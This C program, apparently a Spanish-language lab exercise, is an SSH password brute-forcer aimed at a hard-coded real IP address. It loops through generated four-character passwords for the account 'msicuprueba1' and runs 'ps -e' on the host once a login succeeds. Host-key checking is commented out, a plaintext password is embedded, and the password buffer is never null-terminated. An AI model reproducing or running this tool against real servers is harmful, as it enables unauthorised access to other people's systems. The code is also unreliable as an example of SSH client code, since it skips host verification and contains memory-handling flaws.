#ifdef _WIN32
#include <libssh/libssh.h> 
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")
#else
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>

#include <libssh.h> 
#endif

#include <stdio.h>
#include <stdlib.h>

char *ip = "74.208.234.113";
char *command = "ps -e";

#ifndef _WIN32
	typedef unsigned int SOCKET;
	#define INVALID_SOCKET  (SOCKET)(~0)
	#define SOCKET_ERROR            (-1)
#endif

int verify_knownhost(ssh_session session)
{
  int state, hlen;
  unsigned char *hash = NULL;
  char *hexa;
  char buf[10];
  state = ssh_is_server_known(session);
  hlen = ssh_get_pubkey_hash(session, &hash);
  if (hlen < 0)
    return -1;

  switch (state)
  {
    case SSH_SERVER_KNOWN_OK:
      break; 

    case SSH_SERVER_KNOWN_CHANGED:
      fprintf(stderr, "Host key for server changed: it is now:\n");
      ssh_print_hexa("Public key hash", hash, hlen);
      fprintf(stderr, "For security reasons, connection will be stopped\n");
      free(hash);
      return -1;

    case SSH_SERVER_FOUND_OTHER:
      fprintf(stderr, "The host key for this server was not found but an other"
        "type of key exists.\n");
      fprintf(stderr, "An attacker might change the default server key to"
        "confuse your client into thinking the key does not exist\n");
      free(hash);
      return -1;

    case SSH_SERVER_FILE_NOT_FOUND:
      fprintf(stderr, "Could not find known host file.\n");
      fprintf(stderr, "If you accept the host key here, the file will be"
       "automatically created.\n");

    case SSH_SERVER_NOT_KNOWN:
      hexa = ssh_get_hexa(hash, hlen);
      fprintf(stderr,"The server is unknown. Do you trust the host key?\n");
      fprintf(stderr, "Public key hash: %s\n", hexa);

      //free(hexa);
	 // strncpy( buf, "yes", 10);

      if (fgets(buf, sizeof(buf), stdin) == NULL)
      {
        return -1;
      }

      if (strncmp(buf, "yes",3) != 0)
      {
        return -1;
      }

      if (ssh_write_knownhost(session) < 0)
      {
  	
      	fprintf(stderr, "Error al escribir knowhost\n");
        return -1;
      }
      break;

    case SSH_SERVER_ERROR:
      fprintf(stderr, "Error %s", ssh_get_error(session));
      return -1;
  }
  return 0;
}



int show_remote_processes(ssh_session session)
{
  ssh_channel channel;
  int rc;
  char buffer[256];
  unsigned int nbytes;
  channel = ssh_channel_new(session);

  if (channel == NULL)
    return SSH_ERROR;

  rc = ssh_channel_open_session(channel);
  if (rc != SSH_OK)
  {
    ssh_channel_free(channel);
    return rc;
  }
  rc = ssh_channel_request_exec(channel, command);
  if (rc != SSH_OK)
  {
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return rc;
  }
  nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
  while (nbytes > 0)
  {
     printf("%.*s",nbytes, buffer);
     nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
  };

  if (nbytes < 0)
  {
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return SSH_ERROR;
  }

  ssh_channel_send_eof(channel);
  ssh_channel_close(channel);
  ssh_channel_free(channel);
  return SSH_OK;
}

int main()
{
	int port = 22;
	int rc;
	char *password;
	int verbosity = SSH_LOG_NONE;
	ssh_session my_ssh_session = ssh_new();
	struct hostent *host;

	// Create our socket
	#ifdef _WIN32
		SOCKADDR_IN SockAddr;
		WSADATA WsaDat;
		SOCKET Socket;
	#else
		struct sockaddr_in SockAddr;
		SOCKET Socket;
	#endif
	#ifdef _WIN32
	if(WSAStartup(MAKEWORD(2,2),&WsaDat)!=0)
	{
		printf("Winsock error - Winsock initialization failed\r\n");
		WSACleanup();
		system("PAUSE");
		return 0;
	}

	#endif

	Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(Socket==INVALID_SOCKET)
	{
		printf("Winsock error - Socket creation Failed!\r\n");
		#ifdef _WIN32
		WSACleanup();
		#endif
		system("PAUSE");
		return 0;
	}

	// Resolve IP address for hostname

	if((host=gethostbyname(ip))==NULL)
	{
	    printf("Failed to resolve hostname.\r\n");
		#ifdef _WIN32
		WSACleanup();
		#endif
		system("PAUSE");
		return 0;
	}

    // Setup our socket address structure
    SockAddr.sin_port=htons(22);
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);

    // Attempt to connect to server
    if(connect(Socket,(struct sockaddr*)(&SockAddr),sizeof(SockAddr))!=0)
    {
        printf("Failed to establish connection with server\r\n");
        #ifdef _WIN32
		WSACleanup();
		#endif
        system("PAUSE");
        return 0;
    }
	if (my_ssh_session == NULL){
		exit(-1);
	}
	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, ip);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, "prueba");
	ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_FD, &Socket);

	// Connect to server
	rc = ssh_connect(my_ssh_session);
	if (rc != SSH_OK)
	{
		fprintf(stderr, "Error conectando a %s: %s\n", ip, ssh_get_error(my_ssh_session));
		ssh_free(my_ssh_session);
		exit(-1);
	}

	//Verificar identidad del servidor sino se conoce preguntar si se desea conectar.
	//if (verify_knownhost(my_ssh_session) < 0)
	//{
	//	ssh_disconnect(my_ssh_session);
	//	ssh_free(my_ssh_session);
	//	exit(-1);
	//}

	// //Authenticate ourselves
	password = "q1w2e3r4";
	//rc = ssh_userauth_password(my_ssh_session, NULL, password);
	char prueba[5];

char numeros[10]="0123456789";
char num[3]="567";
char letras[5]="aeiou" ;

for(int z=0;z<3;z=z+1){
  for(int y=0;y<10;y=y+1){
    for(int x=0;x<5;x=x+1){
	
      for(int w=0;w<10;w=w+1){
//strcpy(prueba,numeros[z]);
	prueba[0]=num[z];
	prueba[1]=numeros[y];
	prueba[2]=letras[x];
	prueba[3]=numeros[w];
printf("%s\n",prueba);
rc = ssh_userauth_password(my_ssh_session, "msicuprueba1", prueba);

if (rc != SSH_AUTH_SUCCESS)//quitarle la salida
	{
	printf(" erronea");
	//rc = ssh_connect(my_ssh_session);
	//my_ssh_session=ssh_new();
	}else
	{
	printf("Autenticación exitosa!\n\n");
	w=11;x=6;y=11;z=4;
	show_remote_processes(my_ssh_session);
	ssh_disconnect(my_ssh_session);
	ssh_free(my_ssh_session);
	system("PAUSE");
	return 0;
	}



	}//CICLO
      }
   }
//printf("%s\n",prueba);

}//fin del ciclo




}

